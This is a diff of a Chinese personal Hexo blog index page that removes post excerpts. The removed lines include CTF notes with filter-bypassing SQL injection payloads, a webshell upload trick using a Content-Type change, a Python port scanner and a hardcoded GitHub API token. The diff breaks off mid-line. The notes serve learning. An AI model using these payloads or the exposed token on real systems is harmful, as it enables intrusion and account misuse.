@@ -264,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/16/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/18/%E7%AE%80%E4%BB%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="dele">
@@ -283,7 +283,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/02/16/hello-world/" itemprop="url">Hello World</a></h1>
+                <a class="post-title-link" href="/2020/02/18/%E7%AE%80%E4%BB%8B/" itemprop="url">简介</a></h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-16T19:56:24+08:00">
-                2020-02-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-18T20:00:30+08:00">
+                2020-02-18
               </time>
             
 
@@ -354,19 +354,7 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+            <p>  电脑崩溃东西全没了，只备份了html文件，吐血</p>
 
           
         
@@ -510,22 +498,17 @@
 
       
         
-          
-            <p>已经接触到python的网路编程，在代码实现端口扫描的时候遇到一个问题，</p>
+          <p>已经接触到python的网路编程，在代码实现端口扫描的时候遇到一个问题，</p>
 <p>独立实现循环，然后connect到ip，实现很慢，而使用多线程调用连接函数，就可以在1s内从1-1024完成循环；</p>
 <p>  不禁对python多线程到底如何实现起了兴趣，</p>
 <p>要知道CPU运行极快，所以在我们眼中就很多任务都是并行，实际上是极快的一条一条处理，这里有点后悔没有好好钻研操作系统；</p>
-<p>这些我们不关注，但python多线程是对于每一个任务进行合理的分配运行</p>
-<p>就例如，循环调用一个函数，这个函数需要一定时间，并且这个时间不固定，不固定的时间用在等待上，就比如网络连接，</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"><span class="keyword">from</span> threading import Thread</span><br><span class="line">def main(target):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span><span class="built_in"> port </span><span class="keyword">in</span> range(1,1024):</span><br><span class="line">        t = Thread(<span class="attribute">target</span>=portscan,args=(target,port))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">def portscan(target,port):</span><br><span class="line">   <span class="built_in"> client </span>= socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line"></span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"开放 [] %s:%d"</span> % (target, port))</span><br><span class="line">    except:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"no %d"</span> % (port))</span><br></pre></td></tr></table></figure>
-
-<p>理论上多线程合理分配时间还需要加上分配的时间会更慢，巧在connect是需要等待的，所以python</p>
-<p>这里需要了解下GIL：</p>
-<p>　　Python是解释型语言，那么它在运行的时候就需要解释器了，简单描述下GIL，即global interpreter lock，全局解释器锁，就是python在运行的时候会锁定解释器，就是说在运行的时候只能是一个线程，锁死了，切换不了；每个线程在运行之前都要申请GIL，那么就必须要等上一个线程释放这把锁你才可以申请到，然后执行代码，执行完后，你再交给下一个线程，让它去执行代码，过程如下：</p>
-<p>　　设置GIL -&gt; 切换到一个线程去执行 -&gt; 运行 -&gt; 把线程设置为睡眠状态 -&gt; 解锁GIL</p>
-<p>　　然后再次重复以上步骤。<br>于是网络连接多线程会奇迹般的快，结果如输出如下，并不是按顺序输出：</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">D:\py\test\venv\Scripts\python.exe</span> <span class="string">D:/py/test/portscan.py</span></span><br><span class="line"><span class="string">输入待扫描IP：127.0.0.1</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:135</span></span><br><span class="line"><span class="literal">no</span> <span class="number">137</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:443</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:445</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:902</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:912</span></span><br><span class="line"><span class="literal">no</span> <span class="string">10no</span> <span class="string">12no</span> <span class="number">5</span></span><br><span class="line"><span class="literal">no</span> <span class="number">2</span></span><br><span class="line"><span class="literal">no</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="literal">no</span> <span class="string">8no</span> <span class="string">13no</span> <span class="string">4no</span> <span class="string">1no</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">no</span> <span class="number">30</span></span><br><span class="line"><span class="literal">no</span> <span class="number">28</span></span><br><span class="line"><span class="literal">no</span> <span class="string">35no</span> <span class="string">37no</span> <span class="string">27no</span> <span class="number">24</span></span><br><span class="line"><span class="literal">no</span> <span class="number">29</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/30/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -667,45 +650,17 @@
 
       
         
-          
-            <p>=，select,union</p>
+          <p>=，select,union</p>
 <p>ichunqiu的一道题，过滤的蛮基础的</p>
 <p>  1.打开网页显示是一个数值注入点</p>
 <p>1.29.1</p>
-<ol>
-<li>尝试注入 id = 1 or 1 = 1#</li>
-</ol>
-<p>报错，应该是过滤了，尝试字符后发现是过滤等号</p>
-<p>尝试了 like,rlike，!(&lt;&gt;),都不行，正则regexp可以</p>
-<p>3.注入 id = 1 or 1 regexp 1#</p>
-<p>1.29.2</p>
-<p>4.找回显点，发现select和union都过滤，试了很多，发现&lt;&gt;可以绕过</p>
-<p>构造payload：id = 1 un&lt;&gt;ion se&lt;&gt;lect 1,2,3#</p>
-<p>1.29.4</p>
-<ol>
-<li>接下来就简单了</li>
-</ol>
-<p>库database();</p>
-<p>表：id=1 un&lt;&gt;ion se&lt;&gt;lect 1,(sel&lt;&gt;ect group_concat(table_name) from information_schema.tables where table_schema regexp ‘sqli’ ),3#</p>
-<p>字段：(sel&lt;&gt;ect group_concat(column_name) from information_schema.columns where table_schema regexp ‘sqli’ and table_name regexp ‘info’)</p>
-<p>info过滤，用16进制代替0x696e666f；</p>
-<p>1.29.6</p>
-<p>6.最后出结果</p>
-<p>(se&lt;&gt;lect group_concat(flAg_T5ZNdrm) from info)</p>
-<p>奇怪的是最后一步又不过滤info，搞不懂</p>
-<p>2.sqli这题就是上一题注出的另一个表users</p>
-<p>这题找到注入页面就颇费了一番心思，重定向搞了人一手</p>
-<p>而且发现可以注入</p>
-<p>id = 1 ‘ and ’1/0 时，想着用字符盲注算了，结果ASCII怎么都不行</p>
-<p>气死了，常规注入算了，</p>
-<p>还非常奇怪的是，id= 1 如果注入失败会把URL里的过滤后的语言输出，降低了难度；</p>
-<p>从上面知道逗号被过滤，然后学到可以用 </p>
-<p>union select 1,2,3,4;<br>union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);<br>union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),’ ‘,database(),’ ‘,@@datadir))D);</p>
-<p>ok解决；id=-1’ union select * from (select group_concat(table_name)from information_schema.tables where table_schema = ‘sqli’) a join (select version()) b%23</p>
-<p>l0gin.php?id=-1’ union select * from (select group_concat(column_name)from information_schema.columns where table_name = ‘users’) a join (select version()) b%23</p>
-<p>两题同出一辙；</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/30/sql%E6%B3%A8%E5%85%A5/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -847,30 +802,19 @@
 
       
         
-          
-            <p><a href="http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/" target="_blank" rel="noopener">http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/</a>  + u/2.php</p>
+          <p><a href="http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/" target="_blank" rel="noopener">http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/</a>  + u/2.php</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>localhost<span class="tag">&lt;/<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span><span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">L</span>&gt;</span>utf8<span class="tag">&lt;/<span class="name">L</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
 <p>php菜刀</p>
-<p>过滤php</p>
-<p>脚本一句话shell</p>
-<p>​      </p>
-<p>upload-2</p>
-<p>涉及到文件类型限制和数据库操作</p>
-<p>中国菜刀，</p>
-<p>上传类型限制图片，用burpsuite repeater模块上传一句话php更改content-type为</p>
-<p>image/jepg</p>
-<p>2.1.1</p>
-<p>连接后发现要登录数据里操作，配置</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>localhost<span class="tag">&lt;/<span class="name">H</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;<span class="name">U</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>ctfctfctf<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>也就是数据库的用户名和密码。ok</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/29/upload-ichunqiu/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1012,34 +956,19 @@
 
       
         
-          
-            <p>宽字节注入</p>
+          <p>宽字节注入</p>
 <p>url gbk转，= -》%20,等</p>
 <p>报错注入，</p>
 <p>好复杂，没搞懂什么意思</p>
 <p>是一个函数，没太懂，updatexml函数，具体再补充</p>
 <p>= 过滤代替，like、！（&lt;&gt;），正则regexp</p>
-<p>括号过滤，</p>
-<p>还有可以用burpsuite批量测试过滤语句</p>
-<p>盲注</p>
-<p>sleep()函数</p>
-<p>select 语句 and sleep(),前为真执行sleep，前为假不执行</p>
-<p>or sleep(),前真不执行，前查询为假执行</p>
-<p>if(a,b,c),</p>
-<p>a=1,return b</p>
-<p>a=0,return c</p>
-<p>if()结合 substr()，结合sleep()</p>
-<p>substr(‘字符’，返回的第几个字符，返回字符长度)</p>
-<p>subsring(‘’ ,2) or substing(‘’ from 1)</p>
-<p><img src="https://s2.ax1x.com/2020/01/21/1kZWDS.png" alt="1kZWDS.png"></p>
-<p>过滤逗号，subsring 可以用from 代替， </p>
-<p>if 用 select case when</p>
-<p>字符型盲注</p>
-<p>截取函数，</p>
-<p>mid</p>
-<p>substr/subsring</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/20/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1181,20 +1110,184 @@
 
       
         
-          
-            <p>dump序列</p>
+          <p>dump序列</p>
 <p>loads  逆过程</p>
 <p>配合显示字典</p>
 <p>requests 爬 github网站的code等</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#auther:loop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> loop_json</span><br><span class="line"></span><br><span class="line">key = <span class="string">"baidu"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.github.com/search/code?q=%s"</span> % key</span><br><span class="line"></span><br><span class="line">TOKEN = <span class="string">'00e2b39028d493c56fc2737f7a9fa11011d02ef0'</span></span><br><span class="line">headers = &#123;<span class="string">"Authorization"</span>: <span class="string">"token %s"</span> % TOKEN&#125;</span><br><span class="line">params = &#123;<span class="string">"per_page"</span>: <span class="number">10</span>, <span class="string">"page"</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="comment"># = requests.get(url, headers=headers, params=params)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#d = r.json()</span></span><br><span class="line"></span><br><span class="line">loop_json.abc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"test"</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/17/python-json-beautifulsoup/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+   
+	 <!-- 文章结束表示语-->
+    <div>
+      
+    </div>
 
-<p>Token是账户设置的一个值</p>
-<p>key是查找内容</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">abc</span><span class="params">(ddd)</span>:</span></span><br><span class="line">    _dic = &#123;<span class="string">"name"</span>:<span class="string">"loop"</span>, <span class="string">"age"</span>:<span class="string">"12"</span>&#125;</span><br><span class="line"></span><br><span class="line">    s = json.dumps(_dic, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print type(s)</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#d = json.loads(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print d</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:<span class="comment">#只有主函数是本文件才会运行</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"loop"</span></span><br></pre></td></tr></table></figure>
+    
 
-<p>Beautifulsoup用来爬具体网页的信息</p>
-<p><img src="https://s2.ax1x.com/2020/01/19/1CSj8s.png" alt="1CSj8s.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(html,<span class="string">"html.parser"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缩进格式</span></span><br><span class="line">print(bs.prettify()) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取title标签的所有内容</span></span><br><span class="line">print(bs.title) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取title标签的名称</span></span><br><span class="line">print(bs.title.name) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取title标签的文本内容</span></span><br><span class="line">print(bs.title.string) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取head标签的所有内容</span></span><br><span class="line">print(bs.head) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取第一个div标签中的所有内容</span></span><br><span class="line">print(bs.div) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取第一个div标签的id的值</span></span><br><span class="line">print(bs.div[<span class="string">"id"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取第一个a标签中的所有内容</span></span><br><span class="line">print(bs.a) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有的a标签中的所有内容</span></span><br><span class="line">print(bs.find_all(<span class="string">"a"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取id="u1"</span></span><br><span class="line">print(bs.find(id=<span class="string">"u1"</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有的a标签，并遍历打印a标签中的href的值</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> bs.find_all(<span class="string">"a"</span>): </span><br><span class="line">	print(item.get(<span class="string">"href"</span>)) </span><br><span class="line">	</span><br><span class="line"><span class="comment"># 获取所有的a标签，并遍历打印a标签的文本值</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> bs.find_all(<span class="string">"a"</span>): </span><br><span class="line">	print(item.get_text())</span><br></pre></td></tr></table></figure>
+    
+
+    
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/17/python-requestss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="dele">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="deleのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/17/python-requestss/" itemprop="url">python-requests</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-17T13:47:01+08:00">
+                2020-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0note/" itemprop="url" rel="index">
+                    <span itemprop="name">学习note</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://account.tophant.com/login.html?response_type=code&amp;client_id=b611bfe4ef417dbc&amp;state=2e509c092de6ba1bf39a6fff76dd9a76'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#requests的请求方法:get、post、put、delete、head、options等</span></span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url)</span><br><span class="line">r = requests.post(url,<span class="attribute">data</span>=xxx)</span><br><span class="line">r = requests.put(url)</span><br><span class="line">r = requests.delete(url)</span><br><span class="line">r = requests.head(url)</span><br><span class="line">r = requests.options(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#代理认证：</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">  <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">"http"</span>: <span class="string">"http://user:pass@10.10.1.10:3128/"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看响应码</span></span><br><span class="line"><span class="builtin-name">print</span> r.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment">#重定向</span></span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="builtin-name">print</span> r.history</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看相应内容</span></span><br><span class="line"><span class="builtin-name">print</span> r.text</span><br><span class="line"><span class="builtin-name">print</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改系统默认编码格式</span></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看请求头</span></span><br><span class="line"><span class="builtin-name">print</span> r.request.headers</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看请求参数</span></span><br><span class="line"><span class="builtin-name">print</span> r.request.body</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看响应头</span></span><br><span class="line"><span class="builtin-name">print</span> r.headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存返回的结果</span></span><br><span class="line">fh = open(<span class="string">"abc.png"</span>, <span class="string">'w'</span>)</span><br><span class="line">fh.write(r.content)</span><br><span 